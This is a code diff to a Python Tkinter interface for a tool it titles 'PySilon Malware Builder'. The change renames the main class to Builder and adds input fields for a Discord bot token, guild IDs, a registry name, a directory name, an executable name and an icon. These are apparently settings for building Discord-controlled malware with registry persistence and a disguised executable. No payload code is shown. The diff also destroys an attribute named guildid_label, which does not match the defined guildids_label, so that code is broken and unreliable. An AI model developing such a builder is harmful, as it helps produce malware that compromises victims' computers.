@@ -3,8 +3,7 @@ from tkinter import ttk
 import tkinter.font as tkFont
 from PIL import Image, ImageTk
 
-
-class App:
+class Builder:
     def __init__(self, master):
         self.master = master
         self.master.title("PySilon Malware Builder")
@@ -79,7 +78,47 @@ class App:
         self.compiling_settings_button['state'] = tk.NORMAL
         self.compiling_settings_button['relief'] = 'groove'
         self.canvas.delete("all")
-        self.canvas.create_text(200, 150, text="Content for Button 1", font=("Helvetica", 16), fill="blue")
+
+        # Token
+        # Guild ID
+        # Additional Guild IDs
+        # Registry Name
+        # Directory Name
+        # Executable Name
+        # Icon
+
+
+
+
+
+
+        self.token_label = tk.Label(self.canvas, text='BOT Token:', font=tkFont.Font(family='Consolas', size=16))
+        self.token_label.place(x=220, y=80, anchor=tk.E)
+
+        self.guildids_label = tk.Label(self.canvas, text='*Guild IDs:', font=tkFont.Font(family='Consolas', size=16))
+        self.guildids_label.place(x=220, y=110, anchor=tk.E)
+
+        self.registry_label = tk.Label(self.canvas, text='Registry Name:', font=tkFont.Font(family='Consolas', size=16))
+        self.registry_label.place(x=220, y=140, anchor=tk.E)
+
+        self.directory_label = tk.Label(self.canvas, text='Directory Name:', font=tkFont.Font(family='Consolas', size=16))
+        self.directory_label.place(x=220, y=170, anchor=tk.E)
+
+        self.executable_label = tk.Label(self.canvas, text='Executable Name:', font=tkFont.Font(family='Consolas', size=16))
+        self.executable_label.place(x=220, y=200, anchor=tk.E)
+
+        self.icon_label = tk.Label(self.canvas, text='Icon:', font=tkFont.Font(family='Consolas', size=16))
+        self.icon_label.place(x=220, y=230, anchor=tk.E)
+
+
+
+
+
+
+
+
+
+
 
     def functionality_settings_click(self):
         self.general_settings_button['state'] = tk.NORMAL
@@ -89,6 +128,10 @@ class App:
         self.compiling_settings_button['state'] = tk.NORMAL
         self.compiling_settings_button['relief'] = 'groove'
         self.canvas.delete("all")
+
+        self.token_label.destroy()
+        self.guildid_label.destroy()
+
         self.canvas.create_text(200, 150, text="Content for Button 2", font=("Helvetica", 16), fill="green")
 
     def compiling_settings_click(self):
@@ -103,7 +146,7 @@ class App:
 
 def main():
     root = tk.Tk()
-    app = App(root)
+    Builder(root)
     root.geometry("700x500")
     root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
     root.mainloop()
